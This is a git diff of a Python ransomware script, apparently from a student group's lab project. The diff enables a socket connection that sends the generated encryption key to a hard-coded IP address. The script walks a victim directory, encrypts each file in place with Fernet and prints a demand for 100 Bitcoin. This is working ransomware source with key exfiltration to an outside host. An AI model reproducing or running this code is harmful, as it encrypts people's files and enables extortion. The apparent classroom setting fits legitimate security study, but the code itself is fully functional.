@@ -4,6 +4,7 @@ import socket
 import os
 from cryptography.fernet import Fernet
 import webbrowser
+import time
 
 #finding all the files and subfolders in current directory
 files = []
@@ -21,7 +22,7 @@ for root, dirs, file in os.walk('/media/sf_Ransomware_Group8/Action/Victim_machi
 print(files)
 
 #Socket information
-IP_ADDRESS = '10.125.176.40'
+IP_ADDRESS = '10.125.190.150'
 PORT = 68
 hostname = socket.gethostname()
 
@@ -32,13 +33,13 @@ with open("/media/sf_Ransomware_Group8/Action/Victim_machine/Imp/symkey.key", "w
 print(key)
 
 #Connect to server to transfer key and hostname
-#with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-#	s.connect((IP_ADDRESS, PORT))
-#	print('Successfully connected...transmitting key')
-#	s.send(f'{key}'.encode('utf-8'))
-#	print('Finished transmitting the key!!!')
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+	s.connect((IP_ADDRESS, PORT))
+	print('Successfully connected...transmitting key')
+	s.send(f'{key}'.encode('utf-8'))
+	print('Finished transmitting the key!!!')
 #	os.remove('symkey.key')
-#	s.close()
+	s.close()
 
 #Writing the files with the encrypted text using the key
 for file in files:
@@ -49,6 +50,7 @@ for file in files:
 	contents_encrypted = Fernet(key).encrypt(contents)
 	with open(file, "wb") as thefile:
 		thefile.write(contents_encrypted)
+#	time.sleep(5)
 
 print("All of your files have been encrypted!! Send me 100 Bitcoin or I will delete them in 24 hours!!!")
 
